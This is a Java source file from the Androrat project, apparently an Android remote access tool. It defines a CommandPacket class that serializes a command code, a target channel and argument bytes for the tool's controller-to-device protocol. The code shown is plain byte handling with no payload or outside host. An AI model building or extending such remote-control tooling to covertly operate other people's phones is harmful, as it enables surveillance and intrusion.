/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package Packet;

import java.nio.ByteBuffer;

public class CommandPacket implements Packet {
	private short commande;
	private int targetChannel;
	private byte[] argument;

	public CommandPacket() {

	}

	public CommandPacket(short cmd, int targetChannel, byte[] arg) {
		this.commande = cmd;
		this.argument = arg;
		this.targetChannel = targetChannel;
	}

	public void parse(byte[] packet) {
		ByteBuffer b = ByteBuffer.wrap(packet);
		this.commande = b.getShort();
		this.targetChannel = b.getInt();
		this.argument = new byte[b.remaining()];
		b.get(argument, 0, b.remaining());
	}

	public void parse(ByteBuffer b) {
		this.commande = b.getShort();
		this.targetChannel = b.getInt();
		this.argument = new byte[b.remaining()];
		b.get(argument, 0, b.remaining());
	}

	public byte[] build() {
		byte[] byteCmd = ByteBuffer.allocate(2).putShort(commande).array();
		byte[] byteTargChan = ByteBuffer.allocate(4).putInt(targetChannel).array();
		byte[] cmdToSend = new byte[byteCmd.length + byteTargChan.length + argument.length];

		System.arraycopy(byteCmd, 0, cmdToSend, 0, byteCmd.length);
		System.arraycopy(byteTargChan, 0, cmdToSend, byteCmd.length, byteTargChan.length);
		System.arraycopy(argument, 0, cmdToSend, byteCmd.length + byteTargChan.length, argument.length);

		return cmdToSend;
	}

	public short getCommand() {
		return commande;
	}

	public byte[] getArguments() {
		return argument;
	}
	
	public int getTargetChannel() {
		return targetChannel;
	}

}
